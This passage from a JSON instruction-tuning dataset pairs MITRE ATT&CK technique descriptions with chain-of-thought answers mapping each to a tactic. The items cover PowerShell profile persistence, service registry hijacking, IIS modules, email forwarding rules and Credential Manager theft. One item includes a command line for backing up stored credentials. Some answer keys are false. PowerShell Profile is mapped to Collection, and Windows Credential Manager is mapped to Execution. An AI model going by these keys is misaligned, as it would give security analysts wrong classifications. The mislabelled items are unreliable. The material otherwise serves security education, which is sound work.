      "question": "Which tactic is related to the following description:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.  \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",
      "answer": "The given description is related to sub technique: PowerShell Profile (T1546.013);\nSub technique PowerShell Profile (T1546.013) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.?",
    "context": "",
    "output": "The given description is related to sub technique: Virtual Private Server (T1583.003);\nSub technique Virtual Private Server (T1583.003) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.",
      "answer": "The given description is related to sub technique: Virtual Private Server (T1583.003);\nSub technique Virtual Private Server (T1583.003) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.",
    "context": "",
    "output": "The given description is related to sub technique Services Registry Permissions Weakness (T1574.011);\nSub technique Services Registry Permissions Weakness (T1574.011) is a type of technique Hijack Execution Flow (T1574);\nTechnique Hijack Execution Flow (T1574) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.",
      "answer": "The given description is related to sub technique Services Registry Permissions Weakness (T1574.011);\nSub technique Services Registry Permissions Weakness (T1574.011) is a type of technique Hijack Execution Flow (T1574);\nTechnique Hijack Execution Flow (T1574) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.",
    "context": "",
    "output": "The given description is related to sub technique: IIS Components (T1505.004);\nSub technique IIS Components (T1505.004) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.",
      "answer": "The given description is related to sub technique: IIS Components (T1505.004);\nSub technique IIS Components (T1505.004) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.?",
    "context": "",
    "output": "The given description is related to sub technique Environmental Keying (T1480.001);\nSub technique Environmental Keying (T1480.001) is a type of technique Execution Guardrails (T1480);\nTechnique Execution Guardrails (T1480) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
      "answer": "The given description is related to sub technique Environmental Keying (T1480.001);\nSub technique Environmental Keying (T1480.001) is a type of technique Execution Guardrails (T1480);\nTechnique Execution Guardrails (T1480) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
    "context": "",
    "output": "The given description is related to sub technique Email Forwarding Rule (T1114.003);\nSub technique Email Forwarding Rule (T1114.003) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
      "answer": "The given description is related to sub technique Email Forwarding Rule (T1114.003);\nSub technique Email Forwarding Rule (T1114.003) is a type of technique Email Collection (T1114);\nTechnique Email Collection (T1114) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.?",
    "context": "",
    "output": "The given description is related to sub technique: Outlook Home Page (T1137.004);\nSub technique Outlook Home Page (T1137.004) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",
      "answer": "The given description is related to sub technique: Outlook Home Page (T1137.004);\nSub technique Outlook Home Page (T1137.004) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAn adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.",
    "context": "",
    "output": "The given description is related to sub technique: External Defacement (T1491.002);\nSub technique External Defacement (T1491.002) is a type of technique Defacement (T1491);\nTechnique Defacement (T1491) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAn adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.",
      "answer": "The given description is related to sub technique: External Defacement (T1491.002);\nSub technique External Defacement (T1491.002) is a type of technique Defacement (T1491);\nTechnique Defacement (T1491) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.?",
    "context": "",
    "output": "The given description is related to sub technique: Transport Agent (T1505.002);\nSub technique Transport Agent (T1505.002) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
      "answer": "The given description is related to sub technique: Transport Agent (T1505.002);\nSub technique Transport Agent (T1505.002) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.?",
    "context": "",
    "output": "The given description is related to sub technique: Upload Malware (T1608.001);\nSub technique Upload Malware (T1608.001) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
      "answer": "The given description is related to sub technique: Upload Malware (T1608.001);\nSub technique Upload Malware (T1608.001) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.",
    "context": "",
    "output": "The given description is related to sub technique: Windows Credential Manager (T1555.004);\nSub technique Windows Credential Manager (T1555.004) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.",
      "answer": "The given description is related to sub technique: Windows Credential Manager (T1555.004);\nSub technique Windows Credential Manager (T1555.004) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
    "context": "",
    "output": "The given description is related to sub technique: SSH (T1021.004);\nSub technique SSH (T1021.004) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
      "answer": "The given description is related to sub technique: SSH (T1021.004);\nSub technique SSH (T1021.004) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
